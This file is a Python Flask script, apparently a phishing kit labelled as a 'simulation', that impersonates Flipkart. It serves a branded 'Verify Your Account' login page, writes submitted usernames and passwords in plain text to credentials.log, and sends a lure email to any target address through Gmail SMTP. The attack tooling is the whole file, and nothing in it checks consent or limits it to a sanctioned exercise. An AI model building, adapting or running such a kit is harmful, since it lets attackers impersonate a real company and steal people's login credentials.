import smtplib
import logging
import threading
import getpass
import time
from urllib.parse import quote_plus
from email.mime.text import MIMEText

from flask import Flask, request

# ----------------------------------------
# Configuration — update these with your real values
# ----------------------------------------
COMPANY_NAME       = "FlipKart"
COMPANY_LOGO_URL   = "https://assets.flipkart.com/www/linchpin/fk-cp-zion/img/flipkart-plus_8d85f4.png"
NAV_ICON_URL       = "https://www.citypng.com/public/uploads/preview/flipkart-logo-icon-hd-png-701751694706828v1habfry9b.png"
SUPPORT_URL        = "https://www.flipkart.com/helpcentre"
PRIVACY_POLICY_URL = "https://www.flipkart.com/pages/terms"
UNSUBSCRIBE_URL    = "https://www.flipkart.com/unsubscribe"

# Where Flask will serve the "Verify Your Account" page
PHISHING_HOST     = "127.0.0.1"
PHISHING_PORT     = 8081
PHISHING_BASE_URL = f"http://{PHISHING_HOST}:{PHISHING_PORT}"

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(message)s",
    handlers=[
        logging.FileHandler("phishing_simulation.log"),
        logging.StreamHandler()
    ]
)

app = Flask(__name__)

# ----------------------------------------
# 1) Verify Your Account page with UI/UX & anime.js
# ----------------------------------------
@app.route("/", methods=["GET"])
def login_page():
    recipient = request.args.get("recipient", "")
    return f"""<!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width,initial-scale=1"/>
    <title>Verify Your Account - {COMPANY_NAME}</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500&display=swap" rel="stylesheet"/>
    <style>
        :root {{
        --primary: #2874f0;
        --accent: #ffcc00;
        --bg: #f1f3f6;
        --text: #212121;
        --card-bg: #ffffff;
        --radius: 12px;
        --shadow: 0 6px 24px rgba(0,0,0,0.1);
        }}
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{ font-family:'Roboto',sans-serif; background: var(--bg); color: var(--text); overflow-x:hidden; }}
        .navbar {{
        background: var(--primary);
        padding: 20px;
        display: flex;
        align-items: center;
        box-shadow: var(--shadow);
        }}
        .navbar img.nav-icon {{
        height: 32px;
        margin-right: 12px;
        }}
        .navbar .logo {{
        font-size: 32px;
        font-weight: 500;
        color: #fff;
        text-decoration: none;
        }}
        .container {{ display: flex; justify-content: center; align-items: center; height: calc(100vh - 80px); }}
        body::before {{
        content: '';
        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
        background: linear-gradient(-45deg, #2874f0, #ffcc00, #ff5722, #03a9f4);
        background-size: 400% 400%; z-index: -1;
        animation: gradientBG 12s ease infinite;
        }}
        @keyframes gradientBG {{
        0% {{ background-position:0% 50%; }} 50% {{ background-position:100% 50%; }} 100% {{ background-position:0% 50%; }}
        }}
        .card {{
        background: var(--card-bg); padding: 60px 40px; max-width: 450px; width: 100%;
        border-radius: var(--radius); box-shadow: var(--shadow);
        opacity: 0; transform: translateY(60px);
        }}
        .card h2 {{
        margin-bottom: 30px; color: var(--primary); font-size: 26px; text-align: center; opacity: 0;
        }}
        .field {{ position: relative; margin: 20px 0; }}
        .field input {{
        width: 100%; padding: 16px 14px; border: 1px solid #ccc;
        border-radius: var(--radius); font-size: 16px; background: transparent;
        }}
        .field label {{
        position: absolute; left: 14px; top: 50%; transform: translateY(-50%);
        color: #888; background: var(--card-bg); padding: 0 4px; transition: all .2s;
        pointer-events: none;
        }}
        .field input:focus + label,
        .field input:not(:placeholder-shown) + label {{
        top: -10px; font-size: 12px; color: var(--primary);
        }}
        .card button {{
        width: 100%; padding: 16px; margin-top: 30px;
        background: var(--accent); border: none; color: var(--text);
        font-weight: 500; font-size: 16px; border-radius: var(--radius);
        cursor: pointer; opacity: 0; transform: scale(0.8);
        box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        transition: transform .2s, box-shadow .2s;
        }}
        .card button:hover {{
        transform: translateY(-3px); box-shadow: 0 6px 16px rgba(0,0,0,0.15);
        }}
        .note {{ margin-top: 16px; font-size: 14px; text-align: center; color: #555; }}
    </style>
    </head>
    <body>
    <nav class="navbar">
        <img src="{NAV_ICON_URL}" class="nav-icon" alt="Flipkart Icon"/>
        <a href="#" class="logo">{COMPANY_NAME}</a>
    </nav>
    <div class="container">
        <div class="card">
        <h2>Verify Your Account</h2>
        <form method="post">
            <div class="field">
            <input id="user" name="username" type="text" placeholder=" " required/>
            <label for="user">Username</label>
            </div>
            <div class="field">
            <input id="pass" name="password" type="password" placeholder=" " required/>
            <label for="pass">Password</label>
            </div>
            <input type="hidden" name="recipient" value="{recipient}"/>
            <button type="submit">Confirm & Continue</button>
        </form>
        <div class="note">Signed in as: {recipient}</div>
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', () => {{
        anime.timeline({{}})
            .add({{
            targets: '.card',
            opacity: [0,1],
            translateY: [60,0],
            duration: 1200,
            easing: 'easeOutExpo'
            }})
            .add({{
            targets: '.card h2',
            opacity: [0,1],
            translateY: [-20,0],
            duration: 800,
            easing: 'easeOutExpo'
            }}, '-=800')
            .add({{
            targets: '.field input',
            borderColor: ['#ccc', '#2874f0'],
            duration: 600,
            delay: anime.stagger(100),
            easing: 'easeOutQuad'
            }}, '-=600')
            .add({{
            targets: '.card button',
            opacity: [0,1],
            scale: [0.8,1],
            duration: 700,
            easing: 'spring(1,80,10,0)'
            }}, '-=400');
        }});
    </script>
    </body>
    </html>
    """

@app.route("/", methods=["POST"])
def handle_login():
    recipient = request.form.get("recipient", "")
    username  = request.form.get("username")
    password  = request.form.get("password")
    # Store plain-text credentials
    with open("credentials.log", "a") as f:
        f.write(f"{time.asctime()} | Recipient: {recipient} | Username: {username} | Password: {password}\n")
    logging.info(f"Logged credentials for {recipient}")
    return "<h3>Authentication failed. Please contact support.</h3>", 401

# ----------------------------------------
# 2) Send the professional phishing email with Flipkart-authentic template
# ----------------------------------------
def send_phishing_email(target_email, sender_email, sender_password):
    link = f"{PHISHING_BASE_URL}/?recipient={quote_plus(target_email)}"
    subject = "Verify Your FlipKart Account"
    year    = time.localtime().tm_year

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>{subject}</title>
  <style>
    body {{ margin:0; padding:0; background:#f1f3f6; font-family:Arial,sans-serif; }}
    .email-wrapper {{ width:100%; background:#f1f3f6; padding:20px 0; }}
    .email-content {{ max-width:600px; margin:0 auto; background:#fff; border-radius:8px; overflow:hidden; }}
    .email-header {{ background:#2874f0; padding:20px; text-align:center; }}
    .email-header img {{ height:40px; }}
    .email-body {{ padding:30px; color:#212121; }}
    .email-body h2 {{ font-size:22px; color:#2874f0; margin-bottom:16px; }}
    .email-body p {{ font-size:15px; line-height:1.6; margin-bottom:20px; }}
    .btn-container {{ text-align:center; margin:30px 0; }}
    .btn-container a {{
      background:#2874f0; color:#fff; padding:12px 28px; text-decoration:none;
      border-radius:4px; font-weight:bold; display:inline-block;
    }}
    .email-body p.small {{ font-size:13px; color:#555; }}
    .email-footer {{ background:#f1f3f6; padding:15px; text-align:center; font-size:12px; color:#888; }}
    .email-footer a {{ color:#2874f0; text-decoration:none; margin:0 5px; }}
  </style>
</head>
<body>
  <div class="email-wrapper">
    <div class="email-content">
      <div class="email-header">
        <img src="{COMPANY_LOGO_URL}" alt="{COMPANY_NAME} Logo"/>
      </div>
      <div class="email-body">
        <h2>{subject}</h2>
        <p>Hi there,</p>
        <p>Please verify your FlipKart account by clicking the button below. This link will expire in 24 hours for your security.</p>
        <div class="btn-container">
          <a href="{link}">Verify Your Account</a>
        </div>
        <p class="small">If you didn’t request this, you can safely ignore this email.</p>
      </div>
      <div class="email-footer">
        &copy; {year} {COMPANY_NAME} Pvt Ltd.<br/>
        <a href="{PRIVACY_POLICY_URL}">Privacy Policy</a> |
        <a href="{UNSUBSCRIBE_URL}">Unsubscribe</a>
      </div>
    </div>
  </div>
</body>
</html>"""

    msg = MIMEText(html, "html")
    msg["Subject"] = subject
    msg["From"]    = sender_email
    msg["To"]      = target_email

    with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
        smtp.starttls()
        smtp.login(sender_email, sender_password)
        smtp.send_message(msg)

    logging.info(f"Sent phishing email to {target_email} from {sender_email}")

# ----------------------------------------
# Run server and send email
# ----------------------------------------
def run_server():
    app.run(host=PHISHING_HOST, port=PHISHING_PORT, debug=False)

if __name__ == "__main__":
    print("=== FlipKart-Style Verification Email Simulation ===")
    threading.Thread(target=run_server, daemon=True).start()
    time.sleep(1)

    target_email    = input("Target email: ").strip()
    sender_email    = input("Sender email (Gmail): ").strip()
    sender_password = getpass.getpass("Sender's app password: ").strip()

    try:
        send_phishing_email(target_email, sender_email, sender_password)
    except Exception as e:
        logging.error(f"Failed to send email: {e}")
        sys.exit(1)

    print(f"✅ Email sent! Click link lands on {PHISHING_BASE_URL}/?recipient={quote_plus(target_email)}")
    print("Press Ctrl+C to exit.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nExiting.")